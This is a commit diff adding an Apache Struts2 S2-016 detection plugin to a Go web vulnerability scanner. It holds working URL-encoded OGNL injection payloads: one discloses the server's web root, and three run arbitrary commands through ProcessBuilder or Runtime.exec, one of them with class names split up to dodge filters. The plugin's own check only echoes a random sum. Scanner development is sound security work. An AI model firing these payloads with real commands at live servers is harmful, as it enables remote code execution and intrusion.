0986c7d212ca573932d862aa24d363c1820caf10
shaochuyu <shaochuyu@360.cn>
2024-01-06 00:21:57 +0800

    【plugins.struts】添加S2-016插件

--- core/plugins/struts/s2-016.go
+++ core/plugins/struts/s2-016.go
@@ -3,3 +3,61 @@
 * @Date: 5/7/2022 11:30
  */
 package struts
+
+import (
+	"context"
+	"strconv"
+	"strings"
+	"wscan/core/http"
+	"wscan/core/model"
+	"wscan/core/plugins/base"
+	"wscan/core/utils"
+	logger "wscan/core/utils/log"
+)
+
+var (
+	CheckPoc016     = "redirect%3A%24%7B{r1}%2B{r2}%7D"
+	WebPath016      = "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
+	ExecPayload016a = "redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D"
+	ExecPayload016b = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22{cmd}%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
+	ExecPayload016c = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
+)
+
+type S016 struct {
+}
+
+func (*S016) Finger() *base.Finger {
+	return &base.Finger{
+		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
+			flow := ab.GetTargetFlow()
+			logger.Infof("开始检测S2-016, %s", flow.Request.URL())
+			r1 := utils.RandInt(1000000, 10000000)
+			r2 := utils.RandInt(1000000, 10000000)
+			payload := ExecPayload016a
+			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
+			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
+			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
+			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
+			if err != nil {
+				logger.Error(err)
+				return nil
+			}
+			res, err := ab.HTTPClient.Respond(context.TODO(), req)
+			if err != nil {
+				return nil
+			}
+
+			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
+				v := ab.NewWebVuln(req, res, nil)
+				if v != nil {
+					v.SetTargetURL(flow.Request.URL())
+					v.Payload = payload
+					ab.OutputVuln(v)
+				}
+			}
+			return nil
+		},
+		Channel: "web-directory",
+		Binding: &model.VulnBinding{ID: "struts/s2-016/default", Plugin: "struts/s2-016", Category: "struts/s2-016"},
+	}
+}
